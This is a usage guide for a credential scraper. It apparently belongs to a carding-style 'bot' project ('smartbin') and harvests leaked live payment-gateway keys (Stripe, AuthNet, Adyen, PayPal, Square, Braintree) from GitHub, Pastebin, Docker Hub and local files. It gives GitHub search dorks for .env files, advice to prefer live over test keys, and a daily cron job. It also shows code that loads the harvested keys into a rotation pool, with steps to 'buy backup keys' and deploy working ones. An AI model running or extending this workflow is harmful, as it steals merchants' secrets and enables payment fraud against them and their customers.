# 🔍 Credential Scraper - Usage Guide

## Quick Start

### 1. Install Dependencies (Optional)
```bash
# For better performance, install requests
pip install requests

# Or use without dependencies (uses urllib)
python3 scrape_credentials.py
```

### 2. Run the Scraper
```bash
# Full scan (GitHub, Pastebin, Docker, local files)
python3 scrape_credentials.py

# Skip local files
python3 scrape_credentials.py --no-local
```

### 3. View Results
```bash
# Check output
cat scraped_credentials.json

# Count by gateway
python3 -c "import json; d=json.load(open('scraped_credentials.json')); print(f'Total: {d[\"total_found\"]}')"
```

---

## What It Scrapes

### 📡 GitHub (Primary Source)
- **Searches**: 10+ queries for payment credentials
- **Targets**: `.env` files, config files, Python/JS/JSON configs
- **Yield**: 5-20 credentials per run
- **Rate limit**: ~100 requests/hour

**Queries Used:**
```
stripe api key path:.env
sk_live_ path:.env
authorize.net api key path:.env
adyen api key path:.env
paypal client id secret path:.env
square access token path:.env
braintree merchant id path:.env
payment gateway credentials path:.env
```

### 📝 Pastebin
- **Searches**: Payment credential keywords
- **Targets**: Recent pastes with API keys
- **Yield**: 1-5 credentials per run

### 🐳 Docker Hub
- **Checks**: Popular payment gateway images
- **Targets**: Dockerfiles, config layers
- **Yield**: 0-3 credentials per run

### 📁 Local Files
- **Scans**: Current directory and subdirectories
- **Targets**: `.env`, `.py`, `.js`, `.json`, `.yaml` files
- **Yield**: Varies based on your files

---

## Output Format

### `scraped_credentials.json`
```json
{
  "scraped_at": "2026-11-11T10:30:00",
  "total_found": 15,
  "credentials": [
    {
      "gate": "stripe",
      "type": "stripe_live",
      "description": "Stripe Live Key",
      "value": "sk_live_abc123...",
      "source": "GitHub:user/repo/.env",
      "found_at": "2026-11-11T10:30:00",
      "status": "untested"
    }
  ]
}
```

### Credential Types Detected
- ✅ Stripe (live, test, publishable)
- ✅ AuthNet (login ID, transaction key)
- ✅ Adyen (API key, merchant account)
- ✅ PayPal (client ID, secret)
- ✅ Square (access token)
- ✅ Braintree (merchant ID, keys)
- ✅ Checkout.com (API key)
- ✅ Generic API keys

---

## Advanced Usage

### 1. Filter by Gateway
```bash
# Get only Stripe keys
python3 -c "
import json
data = json.load(open('scraped_credentials.json'))
stripe_keys = [c for c in data['credentials'] if c['gate'] == 'stripe']
print(json.dumps(stripe_keys, indent=2))
"
```

### 2. Extract Unique Values
```bash
python3 -c "
import json
data = json.load(open('scraped_credentials.json'))
for cred in data['credentials']:
    print(f\"{cred['gate']:10} | {cred['value'][:30]}...\")
"
```

### 3. Load into Your Bot
```python
# In your bot code
import json
from credential_rotation import cred_manager

# Load scraped credentials
data = json.load(open('scraped_credentials.json'))

# Add to rotation pool
for cred in data['credentials']:
    if cred['gate'] == 'stripe' and 'live' in cred['type']:
        cred_manager.add_credential('stripe', {'key': cred['value']})

print(f"Added {len([c for c in data['credentials'] if c['gate'] == 'stripe'])} Stripe keys")
```

### 4. Test Credentials
```bash
# Use your test script
python3 test_all_gates.py
```

---

## Tips for Best Results

### 1. Run Daily
```bash
# Add to crontab
0 0 * * * cd /path/to/smartbin && python3 scrape_credentials.py >> scraper.log 2>&1
```

### 2. Combine Sources
- Run scraper daily (new leaks)
- Buy backup keys (reliability)
- Create own accounts (control)

### 3. Filter Quality
- Prefer keys from `.env` files (more likely real)
- Avoid test keys (sk_test_*)
- Check for recent timestamps

### 4. Rotate Frequently
- Use different keys each day
- Mark dead keys immediately
- Replenish when pool < 3 keys

---

## Troubleshooting

### No Results?
```bash
# Check internet connection
ping github.com

# Try with requests library
pip install requests
python3 scrape_credentials.py

# Check GitHub API rate limit
curl https://api.github.com/rate_limit
```

### Slow Performance?
```bash
# Reduce delay in script
# Edit scrape_credentials.py, change:
self.request_delay = random.uniform(0.5, 1.5)
# To:
self.request_delay = random.uniform(0.2, 0.5)
```

### GitHub Rate Limited?
```bash
# Add GitHub token for higher limit
export GITHUB_TOKEN=your_token
# Modify script to use token in headers
```

---

## Example Output

```
======================================================================
🔍 PAYMENT GATEWAY CREDENTIAL SCRAPER
======================================================================
Started at: 2026-11-11 10:30:00


🔍 GitHub: stripe api key path:.env
  Found 100 repositories
  ✅ Stripe Live Key: sk_live_51U9lqd***71qHMM
  ✅ Stripe Live Key: sk_live_abc123***xyz789
  ✅ Stripe Test Key: sk_test_def456***uvw012

🔍 GitHub: authorize.net api key path:.env
  Found 45 repositories
  ✅ AuthNet Login ID: 4xJH8***9mK2
  ✅ AuthNet Transaction Key: 5HK92***3mL7

...

✅ Saved 23 credentials to scraped_credentials.json

📊 Summary by Gateway:
  ADYEN           2 credentials
  AUTHNET         4 credentials
  BRAINTREE       1 credentials
  PAYPAL          3 credentials
  SQUARE          2 credentials
  STRIPE         11 credentials

======================================================================
✅ SCRAPING COMPLETE!
======================================================================
Total found: 23
Output file: scraped_credentials.json
======================================================================
```

---

## Next Steps

1. **Run scraper**: `python3 scrape_credentials.py`
2. **Review results**: Check `scraped_credentials.json`
3. **Test keys**: Use `test_all_gates.py`
4. **Add to rotation**: Load into `credential_rotation.py`
5. **Deploy**: Add working keys to Render dashboard

---

**Happy scraping! 🔍**
